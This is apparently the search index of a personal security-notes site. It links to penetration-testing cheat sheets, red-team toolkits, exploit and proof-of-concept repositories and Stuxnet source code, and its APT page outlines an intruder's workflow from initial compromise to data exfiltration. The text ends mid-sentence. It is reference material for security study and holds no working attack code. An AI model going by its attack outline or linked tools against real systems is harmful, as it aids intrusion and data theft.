{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases. Training Platforms https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/technical-operational https://community.turgensec.com/shodan-pentesting-guide/ Cheatsheets Command line reference \u2013 Database and OS scripting: https://ss64.com/ RTFM (Red Team Field Manual) - https://github.com/leostat/rtfm http://cheat.sh/ curl https : // cht . sh / : cht . sh | sudo tee / usr / local / bin / cht . sh chmod + x / usr / local / bin / cht . sh mkdir ~/ . bash . d curl https : // cheat . sh / : bash_completion ~/ . bash . d / cht . sh chmod + x ~/ . bash . d / cht . sh . ~/ . bash . d / cht . sh # and add . ~/ . bash . d / cht . sh to ~/ . bashrc mkdir ~/ . zsh . d curl https : // cheat . sh / : zsh ~/ . zsh . d / _cht echo fpath=(~/.zsh.d/ $fpath) ~/ . zshrc Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Powershell: https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf Metasploit: https://blogs.sans.org/pen-testing/files/2017/02/MetasploitCheatsheet2.0.pdf Reverse Shell: https://highon.coffee/blog/reverse-shell-cheat-sheet/ Pentest Tools: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ LFI: https://highon.coffee/blog/lfi-cheat-sheet/ VI: https://highon.coffee/blog/vi-cheat-sheet/ Systemd: https://highon.coffee/blog/systemd-cheat-sheet/ Nbtscan: https://highon.coffee/blog/nbtscan-cheat-sheet/ Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Linux: https://highon.coffee/blog/linux-commands-cheat-sheet/ Day-to-day Tools CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode https://pentest.ws/ Defining scope in Burp / ZAP: https://github.com/root4loot/rescope https://www.hackingarticles.in/koadic-com-command-control-framework/ Other Collections https://tools.tldr.run/ https://noobsec.net/ https://github.com/juliocesarfort/public-pentesting-reports Rawsec's CyberSecurity Inventory https://chryzsh.gitbooks.io/pentestbook/ ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening Blogs https://medium.com/@int0x33 https://github.com/sectalks/sectalks Practical use of JavaScript and COM Scriptlets for Penetration Testing: http://www.labofapenetrationtester.com/2016/05/ https://blog.0patch.com https://scriptdotsh.com https://room362.com/blog https://root4loot.com/ POC Repos https://github.com/qazbnm456/awesome-cve-poc Important files A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136 Podcasts https://darknetdiaries.com/ Graphs https://www.graphistry.com/ Pending Analysis CVEs Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs Pending Analysis Tweets https://twitter.com/trimstray- Pending Analysis Tools sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools Discord Channels https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP https://discordapp.com/invite/malwaretech VMS Malware Analysis (windows): https://github.com/GoSecure/malboxes ATT CK ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti Buy Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5 Pending DIY Projects RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio Web NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk= Tools Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time A collection of security related toolsets (mostly Windows): https://github.com/GhostPack Pending Reads Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/ Local Security Experts https://www.linkedin.com/in/kushantha https://www.linkedin.com/in/chanakaseekkuge/ Scripts tr - s | tr \\t | sed s/:/ |/ | sed s/- /| / | sed - e s/$/ |/ Tools Unicode steganography: https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder Incidence Response CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit Webinars Wild West Hackin Casts: https://wildwesthackinfest.com/wild-west-hackin-casts/ Completed Courses Pentester Academy Microsoft and/or Windows Related Windows Red Team Lab Attacking and Defending Active Directory","title":"Home"},{"location":"#home","text":"This repository contains structurally organized, security related quick references, cheat-sheets, and resources maintained by ayomawdb . Please check different categories for more details. Home page is reserved mainly to list down pending analysis and pending research items, and also to point to other similar security related knowledge bases.","title":"Home"},{"location":"#training-platforms","text":"https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material/technical-operational https://community.turgensec.com/shodan-pentesting-guide/","title":"Training Platforms"},{"location":"#cheatsheets","text":"Command line reference \u2013 Database and OS scripting: https://ss64.com/ RTFM (Red Team Field Manual) - https://github.com/leostat/rtfm http://cheat.sh/ curl https : // cht . sh / : cht . sh | sudo tee / usr / local / bin / cht . sh chmod + x / usr / local / bin / cht . sh mkdir ~/ . bash . d curl https : // cheat . sh / : bash_completion ~/ . bash . d / cht . sh chmod + x ~/ . bash . d / cht . sh . ~/ . bash . d / cht . sh # and add . ~/ . bash . d / cht . sh to ~/ . bashrc mkdir ~/ . zsh . d curl https : // cheat . sh / : zsh ~/ . zsh . d / _cht echo fpath=(~/.zsh.d/ $fpath) ~/ . zshrc Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Powershell: https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf Metasploit: https://blogs.sans.org/pen-testing/files/2017/02/MetasploitCheatsheet2.0.pdf Reverse Shell: https://highon.coffee/blog/reverse-shell-cheat-sheet/ Pentest Tools: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ LFI: https://highon.coffee/blog/lfi-cheat-sheet/ VI: https://highon.coffee/blog/vi-cheat-sheet/ Systemd: https://highon.coffee/blog/systemd-cheat-sheet/ Nbtscan: https://highon.coffee/blog/nbtscan-cheat-sheet/ Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Linux: https://highon.coffee/blog/linux-commands-cheat-sheet/","title":"Cheatsheets"},{"location":"#day-to-day-tools","text":"CyberChef: https://gchq.github.io/CyberChef https://www.youtube.com/watch?v=LnhSTZgzKuY GoogleToolbox: https://toolbox.googleapps.com/apps/main/ Browserinfo, MX, Dig, HAR, Log Analyzer, Mail Headers, Encode/Decode https://pentest.ws/ Defining scope in Burp / ZAP: https://github.com/root4loot/rescope https://www.hackingarticles.in/koadic-com-command-control-framework/","title":"Day-to-day Tools"},{"location":"#other-collections","text":"https://tools.tldr.run/ https://noobsec.net/ https://github.com/juliocesarfort/public-pentesting-reports Rawsec's CyberSecurity Inventory","title":"Other Collections"},{"location":"#httpschryzshgitbooksiopentestbook","text":"ComputerSecurityStudent - Metasploitable Project Exploits: https://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18 TYPE=SUB Exploit collection - https://github.com/jivoi/pentest Hacking Methodology: https://www.greycampus.com/opencampus/ethical-hacking/hacking-methodology https://twitter.com/Alra3ees/status/1075569238474141697 Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ Red Teaming/Adversary Simulation Toolkit: https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md Red Team Techniques: Gaining access on an external engagement through spear-phishing: https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/ Red Team Tips: https://vincentyiu.co.uk/red-team-tips/ http://ired.team/ Pasties: https://github.com/threatexpress/pasties/blob/master/pasties.md Red Team Scripts: https://github.com/threatexpress/red-team-scripts 101 Bash Commands and Tips for Beginners to Experts: https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je The Book of Secret Knowledge: https://github.com/trimstray/the-book-of-secret-knowledge Offensive Security Bookmarks: https://jivoi.github.io/2015/07/03/offensive-security-bookmarks/ List of Awesome Red Teaming Resources: https://github.com/yeyintminthuhtut/Awesome-Red-Teaming http://ired.team/offensive-security-experiments/offensive-security-cheetsheets Playbook for system hardening maintained by the #! security research team.: https://github.com/hashbang/hardening","title":"https://chryzsh.gitbooks.io/pentestbook/"},{"location":"#blogs","text":"https://medium.com/@int0x33 https://github.com/sectalks/sectalks Practical use of JavaScript and COM Scriptlets for Penetration Testing: http://www.labofapenetrationtester.com/2016/05/ https://blog.0patch.com https://scriptdotsh.com https://room362.com/blog https://root4loot.com/","title":"Blogs"},{"location":"#poc-repos","text":"https://github.com/qazbnm456/awesome-cve-poc","title":"POC Repos"},{"location":"#important-files","text":"A binary that is a valid JAR, PE, ZIP, HTML: https://github.com/indrora/corkami/blob/master/src/mix/corkamix.asm / https://github.com/indrora/corkami/tree/master/src/mix Zip and Hach Collisions: https://github.com/corkami/collisions Crfting files in pure ASM: https://twitter.com/angealbertini/status/1088866350095835136","title":"Important files"},{"location":"#podcasts","text":"https://darknetdiaries.com/","title":"Podcasts"},{"location":"#graphs","text":"https://www.graphistry.com/","title":"Graphs"},{"location":"#pending-analysis-cves","text":"Cisco CVE-2019-1653 - Allows a remote attacker to get sensitive device configuration details without a password. CVE-2019-1652 - Allows a remote attacker to inject and run admin commands on the device without a password. EternalRomance (MS17-010) Stuxnet CVEs","title":"Pending Analysis CVEs"},{"location":"#pending-analysis-tweets","text":"https://twitter.com/trimstray-","title":"Pending Analysis Tweets"},{"location":"#pending-analysis-tools","text":"sh00t - A Testing Environment for Manual Security Testers: https://github.com/pavanw3b/sh00t http://rumkin.com/tools","title":"Pending Analysis Tools"},{"location":"#discord-channels","text":"https://discordapp.com/invite/VPFWfdt https://discordapp.com/invite/2AG6TCm https://discordapp.com/invite/4gHhxS8 https://discordapp.com/invite/7Z2PmWP https://discordapp.com/invite/malwaretech","title":"Discord Channels"},{"location":"#vms","text":"Malware Analysis (windows): https://github.com/GoSecure/malboxes","title":"VMS"},{"location":"#attck","text":"ATT CKing the Singapore Health Data Breach: https://bitofhex.com/2019/01/13/attack-and-singapore-breach/ HELK Dashboard: https://github.com/Cyb3rWard0g/ATTACK-Python-Client/tree/master/integrations/helk_cti","title":"ATT&amp;CK"},{"location":"#buy","text":"Giant Board: https://groboards.com/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ https://www.aliexpress.com/item/SX1278-ESP32-LoRa-0-96-Inch-Blue-OLED-Display-Bluetooth-WIFI-Lora-Kit-32-Module-IOT/32825749403.html https://www.aliexpress.com/item/13-56mHz-PN532-compatible-raspberry-pie-NFC-card-reader-module/2055119495.html?spm=2114.search0104.3.29.166f4b4fElzuKj ws_ab_test=searchweb0_0,searchweb201602_5_10065_10068_10130_10890_10547_319_10546_317_10548_10545_10696_453_10084_454_10083_10618_431_10307_537_536_10059_10884_10887_100031_321_322_10103-10890,searchweb201603_53,ppcSwitch_0 algo_expid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3-4 algo_pvid=8b42d885-fff2-4797-a3ea-3cfd99a32ed3 transAbTest=ae803_5 Bundle Raspberry Pi 7\" Touchscreen Display Case : https://www.amazon.it/gp/product/B01M0AT5O5","title":"Buy"},{"location":"#pending-diy-projects","text":"RPi Handheld: https://twitter.com/CrankyLinuxUser/status/1095111251510915075 Privacy: https://www.privacynow.net/privacy-devices Network Gears: https://twitter.com/fouroctets/status/1092121490579906560 Tools for capturing and analysing keyboard input paired with microphone capture: https://github.com/ggerganov/kbd-audio","title":"Pending DIY Projects"},{"location":"#web","text":"NES-style CSS Framework: https://nostalgic-css.github.io/NES.css/ itty.bitty.site: https://itty.bitty.site/#How_it_Works/XQAAAAK4CgAAAAAAAAAeHMqHyTY4PyKmqfkwr6ooCXSIMxPQ7ojYR153HqZD3W+keVdvwyoyd+luwncAksxo8PWJs+831jtAVty8rDpGXmyebtxMTP3PSa4g8/593sWue8MDcpOgi1bQyEtfa0JNQZ6T1I/xyNULg1rpwWgE2Y9BnqDq8fDN1N+nd58bizHxZrkeBhdg8inSQ/xKDX7JxpEnuwOAh4FOfn3+EHSxzhJsdQjZfh3lk4tTCDexgFND30Ea3NmmJGK84pdMtEVlcmKC5lrnUNmgoJa3QFsHJkr5595tk03idElTDVhmcQI3jSvPrkTVFTnSLeARVZXV/EUiF0y7+cR3bVkLoTkamZWDMiCTY2Xhv0LdNqWlb/xxyk6takRLrNnS8DkifXEbevTbJOUamuK7uy55kL61btF+/lYNHLWGbh1ckCYglReWWMlM0k4uuqM24okcS74tHtOW3Y5HZYBmPvRR+ItSrZPvbj3kbztOrWapUp7nAzgfIjYoBV/4xOXpFbbaHRft5GICE5Mr1PQhmW/nB63nTpnR+7UdHag8WIMa7nf+NvTPKC5MmQnKzhaMuqEnwGgcM5vkWbekimBclkGJwTGeyhxL7N6hivY+KS3H7vcOSFHXGr7K3PBIQZbywqQiimQ6B6zu4RvH7ZZ3ZN++ii00HKM0FPMcNHuOnL99vAxEl6TEFnx4J4+fwzJwNbuut30TFMBgcrE4iKAGncFIHmvOstFWxE+VlvTLC+uy6XArTO8BdfmbByGiyFv8Al7HqLAzGShdGWNzJ6cPpRwMAmWl5GNRA4qwjQAlfF1dtTwfIXSWOL7AyRwxPs27uY2cvVHCdmVVTNDYiTzHeKX6D9e2ApDRFD6pgcA9VMVP6UeOdVdmwRJ+iLTwQuCdLbVWzQ5T2i/chlihD+RawylXJQ8bKvxW9egXGcrgR5dyKaZCr8nBrArAgtRLR7PdqBQQbr5VodBvPc2FP3fZ6UuQVI1Kg4KcY44GIU5vnlM029TU+ibO2iSX3FhusTFhyOxl4TjjkuXBqA1V7Ha/Op2m8QZaP68p7AAZPOcTHAwP5PxENqIf8qS2aaG2Fiwp5rNED3LhPMjtN54klBYylr5hSAr0TD8J+XwFds8Gq9LToLE8Cq7XNJnE9RqNudIozaMWkfc6PRFjp/aH87x97nPDelKKHGyUEnGJyobw45BOhJMKzZST0VA5v+uQQo0djDXc0UXwzNRIWeBLuUJQpaXZY2gZMuLiSERgyDHg2MBI6trWsyb3ZWbFS4rm8Gq2dxfih3Kj6MdNapUo/jltQ31nx2LepJCQe9DNNF6JEMecls6dHTAM2RfHxEODSSKkF17FfjRLRAfxCK927UvizAxxggP5S/HrX6mGc5xonBy3StLd16thiAG860IdvFyBKfE6+CIhe2jzIwIofNiBILYlKA61vKkjlfZjqsUGDLi426U/Y8bdpxfg7FX1gqNEHeVM17dlBTO7pNOnKyeM2xmLoE7lr92/VIrxJ2OqNfcHu9XjrD6l71vU083VwwAq8Vencm9xLAlDyy3/6BB0kRBiJbjayYrLUbQyMGTFfEvOPmc/zJjfdnqHmg5O/0kuzf2+w5CHD426iPngjmiTo5Snlf+qW8emK/ltnQQIv2ufykH+Px3XZM+zsOclAyHI5MbCKBKeT6j5geCiz3uqci1w5ZlpRjtJWUT6zCj8Fx1eg4F4ov51gaODKV+QQWeFJSyuVTm3Nu2i7AbhKikNzb3RBeQinEh9KrhHc+o4JGezOU55h1UZtonB0+J5dfBRqHnc+6HaXfTmcLrMZjWErq15cBmC0Kx6BNyqP3uGhMUSF+OuIzffEX9fGUNDpUtCjKdbml8uF43e4fN8o10TxYkbggTcyYKI+xWHMyKM2tjOideyDwt33minfEy/JgSLsihBnBua9sfXCg32/+i2okk=","title":"Web"},{"location":"#tools","text":"Invisible Watermarks with Space Characters in ASCII Files: https://github.com/Neo23x0/space-id universal command-line interface for SQL databases: https://github.com/xo/usql Video editing: https://twitter.com/digininja/status/1007936435129847808 Multitail - Look at multiple log files in the same time A collection of security related toolsets (mostly Windows): https://github.com/GhostPack","title":"Tools"},{"location":"#pending-reads","text":"Analysis of following malware: * Badrabbit * NotPetya * Lazarus * https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf VPN Services: * NordVPN * MonoVM https://www.rebootuser.com/","title":"Pending Reads"},{"location":"#local-security-experts","text":"https://www.linkedin.com/in/kushantha","title":"Local Security Experts"},{"location":"#httpswwwlinkedincominchanakaseekkuge","text":"","title":"https://www.linkedin.com/in/chanakaseekkuge/"},{"location":"#scripts","text":"tr - s | tr \\t | sed s/:/ |/ | sed s/- /| / | sed - e s/$/ |/","title":"Scripts"},{"location":"#tools_1","text":"Unicode steganography: https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder","title":"Tools"},{"location":"#incidence-response","text":"CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit","title":"Incidence Response"},{"location":"#webinars","text":"Wild West Hackin Casts: https://wildwesthackinfest.com/wild-west-hackin-casts/","title":"Webinars"},{"location":"#completed-courses","text":"Pentester Academy Microsoft and/or Windows Related Windows Red Team Lab Attacking and Defending Active Directory","title":"Completed Courses"},{"location":"apt/","text":"APT Sponsored Cyber attacks targeting specific organizations to achieve a clear objective without being detected for a long period of time - CSTT Trainings: https://www.activecountermeasures.com/cyber-threat-hunting-training-course/ Workflow Initial compromise Establish beachhead: Ensure future access to compromised assets without needing a repeat initial intrusion Escalate privileges Internal reconnaissance Network colonization Persist Complete mission: Exfiltrate stolen data Analysis Reports Advanced Persistent Threat Golden_hands - Digital Bank Robbery of the Year 2020: https://www.vulnerability-db.com/?q=articles%2F2020%2F04%2F30%2Fadvanced-persistent-threat-goldenhands-digital-bank-robbery-year-2020 FireEye APT analysis reports: https://www.fireeye.com/current-threats/apt-groups.html Mandiant Report: APT1 - Exposing One of China\u2019s Cyber Espionage Units: https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf Stuxnet - Duqu Flame (Equation Group) Spread by LNK exploit via USB Escalation using MS09-025 https://github.com/micrictor/stuxnet https://github.com/SilverPoision/stuxnet-source-code Equation Group: Double Fantasy Equation Drug Fanny - Worm Grayfish https://wikileaks.org/ciav7p1/cms/files/Equation_group_questions_and_answers.pdf https://securelist.com/inside-the-equationdrug-espionage-platform/69203/ https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/ Fanny Malware: https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787/ https://arstechnica.com/information-technology/2015/02/how-omnipotent-hackers-tied-to-the-nsa-hid-for-14-years-and-were-found-at-last/3/ https://malpedia.caad.fkie.fraunhofer.de/details/win.equationdrug https://www.antiy.net/p/the-analysis-of-equation-drug-the-fourth-analysis-report-of-equation-group/ https://www.cs.bu.edu/~goldbe/teaching/HW55815/presos/eqngroup.pdf https://www.kaspersky.com/about/press-releases/2015_equation-group-the-crown-creator-of-cyber-espionage GrayFish has a bootkit The Kane incident http://www.securityfocus.com/news/122 BO2K Remote Access Trojans by Cult of the Dead Cow was left to be discovered. Washington University s Medical Center believed that the attack was prevented. One of the files catalogs the name , address , birth date , social security number , height and weight of over four thousand cardiology patients , along with each medical procedure they underwent . Another file provides similar information on seven hundred physical rehabilitation patients . A third file chronicles every admission , discharge and transfer within the hospital during a five - month period . C2 Techniques Using Trusted Forums to exchange messages Intercepting SYSCalls INS_Delete: Delete a specific instruction INS_RewriteMemmoryOperand: Change memory address by the program PIN_AddSyscallEntryFunction: Intercept syscalls at the entry point PIN_AddSyscallExitFunction: Execute after syscall (usable to alter the result) Adversary Emulation Don't wait for maturity to start doing AE Find the gap and then find the tool for that https://github.com/center-for-threat-informed-defense/adversary_emulation_library Start: https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md#step-2---fin6-discovery No need to have full plan in place Detect / Block / Alert Platforms: https://plextrac.com/ FOSS: https://vectr.io/ Thoughts Know the enemy - Frameworks Will drive investment Take as much time as needed Iterate! Fin6","title":"APT"},{"location":"apt/#apt","text":"Sponsored Cyber attacks targeting specific organizations to achieve a clear objective without being detected for a long period of time - CSTT Trainings: https://www.activecountermeasures.com/cyber-threat-hunting-training-course/","title":"APT"},{"location":"apt/#workflow","text":"Initial compromise Establish beachhead: Ensure future access to compromised assets without needing a repeat initial intrusion Escalate privileges Internal reconnaissance Network colonization Persist Complete mission: Exfiltrate stolen data","title":"Workflow"},{"location":"apt/#analysis-reports","text":"Advanced Persistent Threat Golden_hands - Digital Bank Robbery of the Year 2020: https://www.vulnerability-db.com/?q=articles%2F2020%2F04%2F30%2Fadvanced-persistent-threat-goldenhands-digital-bank-robbery-year-2020 FireEye APT analysis reports: https://www.fireeye.com/current-threats/apt-groups.html Mandiant Report: APT1 - Exposing One of China\u2019s Cyber Espionage Units: https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf Stuxnet - Duqu Flame (Equation Group) Spread by LNK exploit via USB Escalation using MS09-025 https://github.com/micrictor/stuxnet https://github.com/SilverPoision/stuxnet-source-code Equation Group: Double Fantasy Equation Drug Fanny - Worm Grayfish https://wikileaks.org/ciav7p1/cms/files/Equation_group_questions_and_answers.pdf https://securelist.com/inside-the-equationdrug-espionage-platform/69203/ https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/ Fanny Malware: https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787/ https://arstechnica.com/information-technology/2015/02/how-omnipotent-hackers-tied-to-the-nsa-hid-for-14-years-and-were-found-at-last/3/ https://malpedia.caad.fkie.fraunhofer.de/details/win.equationdrug https://www.antiy.net/p/the-analysis-of-equation-drug-the-fourth-analysis-report-of-equation-group/ https://www.cs.bu.edu/~goldbe/teaching/HW55815/presos/eqngroup.pdf https://www.kaspersky.com/about/press-releases/2015_equation-group-the-crown-creator-of-cyber-espionage GrayFish has a bootkit The Kane incident http://www.securityfocus.com/news/122 BO2K Remote Access Trojans by Cult of the Dead Cow was left to be discovered. Washington University s Medical Center believed that the attack was prevented. One of the files catalogs the name , address , birth date , social security number , height and weight of over four thousand cardiology patients , along with each medical procedure they underwent . Another file provides similar information on seven hundred physical rehabilitation patients . A third file chronicles every admission , discharge 